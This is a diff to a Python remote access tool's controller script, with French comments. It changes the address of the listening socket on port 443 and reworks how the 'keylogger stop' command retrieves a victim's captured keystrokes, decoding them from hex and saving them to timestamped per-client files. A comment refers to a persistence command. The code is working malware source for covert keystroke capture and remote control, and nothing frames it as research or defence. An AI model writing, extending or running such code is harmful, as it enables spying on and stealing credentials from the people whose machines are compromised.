@@ -70,7 +70,7 @@ def connection():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     # Bind the socket to an IP address and port
-    s.bind(("192.168.100.9", 443))
+    s.bind(("192.168.1.37", 443))
 
     # Start listening for incoming connections
     s.listen(5)
@@ -248,27 +248,29 @@ def shell():
                 continue
             
             elif command.strip() == "keylogger stop":
-                # Envoyer la commande pour arrêter l'enregistrement
                 sending(command)
-                
-                # Attendre la réponse
                 response = receive()
-                
-                # Vérifier si la réponse est réussie
                 if response.get("status") == "success":
-                    # Récupérer le chemin du fichier et créer un nom unique pour le fichier de frappes
-                    timestamp = time.strftime("%Y%m%d-%H%M%S")  # Format : 20250101-103000
+                    timestamp = time.strftime("%Y%m%d-%H%M%S")
                     keystrokes_path = os.path.join(client_folder, "keylogger", f"keystrokes_{timestamp}.txt")
-                    
-                    # Sauvegarder le fichier de frappes reçu dans le dossier approprié
                     try:
+                        hex_data = response["data"]
+                        print(f"Received hex data: {hex_data}")  # Log pour vérifier les données reçues
+                        file_data = bytes.fromhex(hex_data)
+                        
+                        # Vérifier si les données décodées sont non vides avant de sauvegarder
+                        if not file_data.strip():
+                            print("Received file is empty.")
+                            return
+                        
                         with open(keystrokes_path, "wb") as f:
-                            f.write(bytes.fromhex(response["data"]))  # Convertir les données hexadécimales en bytes et les écrire
+                            f.write(file_data)
                         print(f"Keystrokes file saved at: {keystrokes_path}")
                     except Exception as e:
                         print(f"Error saving keystrokes file: {str(e)}")
                 else:
                     print(f"Failed to receive keystrokes file: {response.get('message')}")
+
 
             
             # Code côté serveur pour envoyer la commande persistance
